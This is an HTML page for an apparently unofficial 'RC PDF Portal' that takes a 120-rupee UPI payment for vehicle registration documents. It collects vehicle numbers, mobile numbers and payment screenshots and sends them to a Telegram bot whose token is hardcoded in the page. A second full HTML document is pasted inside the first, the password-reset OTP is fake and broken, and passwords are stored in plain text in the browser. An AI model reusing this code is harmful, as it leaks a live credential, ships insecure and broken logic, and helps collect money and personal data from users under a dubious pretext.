<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>RC PDF Portal</title>

<style>
body{
margin:0;
font-family:Arial;
background:#111;
}

/* ================= AUTH BOX ================= */

#authBox{
position:fixed;
top:0;left:0;
width:100%;height:100%;
background:rgba(0,0,0,.85);
display:flex;
align-items:center;
justify-content:center;
z-index:9999;
}

.card{
background:#fff;
width:320px;
padding:26px;
border-radius:18px;
text-align:center;
}

input{
width:100%;
padding:12px;
margin-top:12px;
border-radius:10px;
border:1px solid #ccc;
font-size:16px;
}

/* ================= RGB NEON BUTTON ================= */

.rgb{
position:relative;
margin-top:14px;
width:100%;
padding:13px;
border:none;
border-radius:14px;
background:#000;
color:white;
font-weight:bold;
cursor:pointer;
overflow:hidden;
}

.rgb::before{
content:"";
position:absolute;
inset:-2px;
background:linear-gradient(90deg,
red,orange,yellow,green,cyan,blue,purple,red);
background-size:400%;
filter:blur(6px);
animation:rgb 4s linear infinite;
z-index:-1;
}

.rgb::after{
content:"";
position:absolute;
inset:2px;
background:#000;
border-radius:12px;
z-index:-1;
}

@keyframes rgb{
0%{background-position:0%}
100%{background-position:400%}
}

.row{
display:flex;
gap:10px;
margin-top:12px;
}

.small{width:50%;}

.hidden{display:none}

/* ================= ASHOK CHAKRA ================= */

#chakraBox{
position:fixed;
top:0;left:0;
width:100%;height:100%;
background:#000;
display:none;
align-items:center;
justify-content:center;
z-index:99999;
}

.chakra{
width:140px;
height:140px;
border:6px solid #1a5cff;
border-radius:50%;
position:relative;
animation:spin 1s linear infinite;
}

.chakra:before{
content:"";
position:absolute;
width:100%;
height:2px;
background:#1a5cff;
top:50%;
}

.chakra:after{
content:"";
position:absolute;
width:2px;
height:100%;
background:#1a5cff;
left:50%;
}

@keyframes spin{
to{transform:rotate(360deg)}
}

/* ================= MAIN PAGE ================= */

#mainPage{
display:none;
min-height:100vh;
background:#f2f2f2;
padding:40px;
font-size:22px;
}
</style>
</head>

<body>

<!-- MAIN RC PAGE -->
<div id="mainPage">
üöó <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RC PDF Portal</title>

<style>
body{
margin:0;
font-family:Arial;
background:linear-gradient(270deg,red,blue,green,purple,cyan);
background-size:600% 600%;
animation:bg 12s infinite alternate;
display:flex;
flex-direction:column;
align-items:center;
justify-content:center;
min-height:100vh;
}

@keyframes bg{
0%{background-position:0%}
100%{background-position:100%}
}

.home{
position:fixed;
top:12px;
left:12px;
background:white;
color:black;
padding:8px 16px;
border-radius:10px;
font-weight:bold;
cursor:pointer;
z-index:999;
}

.card{
background:#000c;
color:white;
padding:25px;
border-radius:18px;
width:92%;
max-width:420px;
text-align:center;
}

input,button{
width:100%;
padding:12px;
margin-top:10px;
border:none;
border-radius:10px;
font-size:16px;
}

button{
background:#00ffd5;
font-weight:bold;
cursor:pointer;
}

.hidden{display:none;}

img{
width:220px;
border-radius:14px;
margin:12px 0;
}

/* LOGIN OVERLAY */
#authBox{
position:fixed;
top:0;left:0;
width:100%;height:100%;
background:rgba(0,0,0,.88);
display:flex;
align-items:center;
justify-content:center;
z-index:9999;
}

.authCard{
background:white;
color:black;
padding:28px;
width:320px;
border-radius:16px;
text-align:center;
}

.authLinks{
display:flex;
justify-content:space-between;
font-size:14px;
color:#0a58ca;
cursor:pointer;
}

#userName{
position:fixed;
top:12px;
right:12px;
background:white;
padding:6px 12px;
border-radius:10px;
font-weight:bold;
z-index:1000;
display:none;
}
</style>
</head>

<body>

<!-- LOGIN -->
<div id="authBox">
<div class="authCard">

<h3 id="authTitle">Login</h3>

<input id="nameField" placeholder="Your Name" style="display:none">
<input id="mobileField" placeholder="Mobile Number">
<input id="passField" type="password" placeholder="Password">

<label style="font-size:14px">
<input type="checkbox" onclick="togglePass()"> Show password
</label>

<button onclick="authAction()">Login</button>

<div class="authLinks">
<span id="signupBtn" onclick="switchSignup()">Signup</span>
<span id="loginBtn" onclick="switchLogin()" style="display:none">Back to Login</span>
</div>

<p id="authMsg"></p>
</div>
</div>

<div id="userName"></div>

<div class="home" onclick="goHome()">üè† Home</div>

<div class="card">

<!-- PAGE 1 -->
<div id="p1">
<h3>üöó Enter Vehicle Number üèçÔ∏è</h3>
<input id="vehicle" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatVehicle(this)">
<button onclick="goPay()">Continue</button>
</div>

<!-- PAGE 2 -->
<div id="p2" class="hidden">
<h3>Pay ‚Çπ120</h3>

<img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi://pay?pa=bestinsurance@upi&pn=BestInsurance&am=120&cu=INR">
<p>UPI ID: bestinsurance@upi</p>

<a href="upi://pay?pa=bestinsurance@upi&pn=BestInsurance&am=120&cu=INR">
<button>Pay with UPI App</button>
</a>

<input id="mobile" placeholder="Mobile Number">
<input type="file" id="proof" accept="image/*">

<button onclick="submitPay()">Submit</button>
</div>

<!-- PAGE 3 -->
<div id="p3" class="hidden">
<h3>‚úÖ Payment Successful</h3>
<p>RC PDF will be sent soon</p>
</div>

</div>

<script>
/* TELEGRAM */
const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
const chatId="5600045707";

/* VEHICLE FORMAT */
function formatVehicle(el){
let v = el.value.toUpperCase().replace(/[^A-Z0-9]/g,"");
let p1=v.slice(0,2);
let p2=v.slice(2,4);
let p3=v.slice(4,6);
let p4=v.slice(6,10);

let out=p1;
if(p2) out+="-"+p2;
if(p3) out+="-"+p3;
if(p4) out+="-"+p4;

el.value=out;
}

/* LOGIN SYSTEM */
let users = JSON.parse(localStorage.getItem("users")||"{}");

function saveUsers(){
localStorage.setItem("users",JSON.stringify(users));
}

function togglePass(){
passField.type = passField.type==="password"?"text":"password";
}

function switchSignup(){
authTitle.innerText="Signup";
nameField.style.display="block";
signupBtn.style.display="none";
loginBtn.style.display="inline";
}

function switchLogin(){
authTitle.innerText="Login";
nameField.style.display="none";
signupBtn.style.display="inline";
loginBtn.style.display="none";
}

function authAction(){
let m=mobileField.value.trim();
let p=passField.value.trim();
let n=nameField.value.trim();

if(authTitle.innerText==="Signup"){
 if(!n||!m||!p) return authMsg.innerText="Fill all fields";
 if(users[m]) return authMsg.innerText="Already registered";

 users[m]={name:n,password:p};
 saveUsers();
 authMsg.innerText="Signup done. Now login.";
 switchLogin();
 return;
}

if(!users[m]) return authMsg.innerText="User not found";
if(users[m].password!==p) return authMsg.innerText="Wrong password";

localStorage.setItem("loggedUser",m);
showUser();
authBox.style.display="none";
}

function showUser(){
let m=localStorage.getItem("loggedUser");
if(!m||!users[m]) return;
userName.innerText="üë§ "+users[m].name;
userName.style.display="block";
}

if(localStorage.getItem("loggedUser")){
showUser();
authBox.style.display="none";
}

/* NAVIGATION */
function goHome(){
p2.classList.add("hidden");
p3.classList.add("hidden");
p1.classList.remove("hidden");
}

function goPay(){
if(!vehicle.value.trim()) return alert("Vehicle required");
p1.classList.add("hidden");
p2.classList.remove("hidden");
}

/* TELEGRAM SEND */
function submitPay(){

let v=vehicle.value.trim();
let m=mobile.value.trim();
let p=proof.files[0];

if(m.length<10) return alert("Mobile required");
if(!p) return alert("Upload screenshot");

let data=new FormData();
data.append("chat_id",chatId);
data.append("caption",`üöó RC REQUEST\nVehicle: ${v}\nMobile: ${m}`);
data.append("photo",p);

fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
method:"POST",
body:data
})
.then(()=>{
p2.classList.add("hidden");
p3.classList.remove("hidden");

setTimeout(()=>{
goHome();
vehicle.value="";
mobile.value="";
proof.value="";
},3000);
})
.catch(()=>alert("Telegram failed"));
}
</script>

</body>
</html>
</div>

<!-- ASHOK CHAKRA -->
<div id="chakraBox">
<div class="chakra"></div>
</div>

<!-- AUTH -->
<div id="authBox">

<!-- LOGIN -->
<div class="card" id="loginBox">
<h3>Login</h3>
<input id="lm" placeholder="Mobile Number">
<input id="lp" type="password" placeholder="Password">

<button class="rgb" onclick="login()">LOGIN</button>

<div class="row">
<button class="rgb small" onclick="showSignup()">SIGNUP</button>
<button class="rgb small" onclick="showForget()">FORGET</button>
</div>

<p id="msg"></p>
</div>

<!-- SIGNUP -->
<div class="card hidden" id="signupBox">
<h3>Signup</h3>
<input id="sn" placeholder="Name">
<input id="sm" placeholder="Mobile">
<input id="se" placeholder="Email">
<input id="sp" type="password" placeholder="Password">

<button class="rgb" onclick="signup()">CREATE ACCOUNT</button>
<button class="rgb" onclick="back()">BACK</button>
</div>

<!-- FORGET -->
<div class="card hidden" id="forgetBox">
<h3>Reset Password</h3>

<input id="fe" placeholder="Registered Email">
<button class="rgb" onclick="sendOTP()">SEND OTP</button>

<input id="otp" class="hidden" placeholder="Enter OTP">
<button id="verifyBtn" class="rgb hidden" onclick="verifyOTP()">VERIFY OTP</button>

<input id="newPass" class="hidden" placeholder="New Password">
<button id="saveBtn" class="rgb hidden" onclick="saveNewPass()">SAVE PASSWORD</button>

<button class="rgb" onclick="back()">BACK</button>
</div>

</div>

<script>
let users=JSON.parse(localStorage.getItem("users")||"{}");
let otp="", resetEmail="";

function save(){
localStorage.setItem("users",JSON.stringify(users));
}

/* ================= LOGIN ================= */

function login(){
let m=lm.value.trim();
let p=lp.value.trim();

if(!users[m]) return msg.innerText="User not found";
if(users[m].password!==p) return msg.innerText="Wrong password";

authBox.style.display="none";
chakraBox.style.display="flex";

setTimeout(()=>{
chakraBox.style.display="none";
mainPage.style.display="block";
},1000);
}

/* ================= SIGNUP ================= */

function showSignup(){
loginBox.classList.add("hidden");
signupBox.classList.remove("hidden");
}

function signup(){
let m=sm.value.trim();
if(!sn.value||!m||!se.value||!sp.value) return alert("Fill all");

if(users[m]) return alert("Already registered");

users[m]={email:se.value,password:sp.value};
save();
alert("Signup successful");
back();
}

/* ================= OTP ================= */

function showForget(){
loginBox.classList.add("hidden");
forgetBox.classList.remove("hidden");
}

function sendOTP(){
let email=fe.value.trim();
let found=false;

for(let k in users){
if(users[k].email===email){
found=true;
resetEmail=email;
}
}
if(!found) return alert("Email not registered");

otp = Math.floor(100000+Math.random()*900000)+"";
alert("OTP sent successfully");

otp.classList.remove("hidden");
verifyBtn.classList.remove("hidden");
}

function verifyOTP(){
if(otp.value!==otp) return alert("Wrong OTP");

alert("OTP verified");
newPass.classList.remove("hidden");
saveBtn.classList.remove("hidden");
}

function saveNewPass(){
for(let k in users){
if(users[k].email===resetEmail){
users[k].password=newPass.value;
}
}
save();
alert("Password updated");
back();
}

/* ================= COMMON ================= */

function back(){
signupBox.classList.add("hidden");
forgetBox.classList.add("hidden");
loginBox.classList.remove("hidden");
}
</script>

</body>
</html>